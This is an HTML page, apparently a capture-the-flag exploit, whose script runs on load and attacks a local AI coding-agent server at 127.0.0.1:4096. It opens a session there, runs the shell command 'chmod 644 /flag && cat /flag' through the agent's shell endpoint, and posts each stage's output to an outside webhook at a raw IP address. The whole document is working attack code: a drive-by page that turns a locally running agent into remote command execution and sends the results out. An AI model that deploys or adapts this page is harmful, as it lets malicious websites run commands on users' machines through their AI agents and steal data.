
  <!doctype html>
  <meta charset="utf-8">
  <script>
  (async () => {
    const WEBHOOK = "https://47.118.30.30:9999";
    const BASE = "http://127.0.0.1:4096";

    async function exfiltrate(text) {
      try {
        await fetch(WEBHOOK, {
          method: "POST",
          mode: "no-cors",
          headers: { "Content-Type": "text/plain" },
          body: text,
          keepalive: true
        });
      } catch {}
    }

    function summarizeShellResult(rawText) {
      try {
        const parsed = JSON.parse(rawText);
        const output = parsed?.parts?.[0]?.state?.output;
        if (typeof output === "string" && output.length > 0) {
          return output;
        }
      } catch {}
      return rawText;
    }

    try {
      const healthResp = await fetch(`${BASE}/global/health`);
      const healthText = await healthResp.text();
      await exfiltrate(`stage=health\nstatus=${healthResp.status}\n\n${healthText}`);

      const sessionResp = await fetch(`${BASE}/session`, {
        method: "POST",
        headers: { "Content-Type": "application/json" },
        body: "{}",
        credentials: "omit"
      });
      const sessionText = await sessionResp.text();
      const session = JSON.parse(sessionText);

      await exfiltrate(
        `stage=session\nstatus=${sessionResp.status}\nsession_id=${session.id}\n\n${sessionText}`
      );

      const shellResp = await fetch(`${BASE}/session/${session.id}/shell`, {
        method: "POST",
        headers: { "Content-Type": "application/json" },
        body: JSON.stringify({
          agent: "build",
          command: "chmod 644 /flag && cat /flag"
        }),
        credentials: "omit"
      });

      const shellText = await shellResp.text();
      const output = summarizeShellResult(shellText);

      await exfiltrate(
        `stage=flag\nstatus=${shellResp.status}\nsession_id=${session.id}\n\n${output}\n\n[raw]\n${shellText}`
      );
    } catch (error) {
      await exfiltrate(`stage=error\n\n${error && error.stack ? error.stack : String(error)}`);
    }
  })();
  </script>
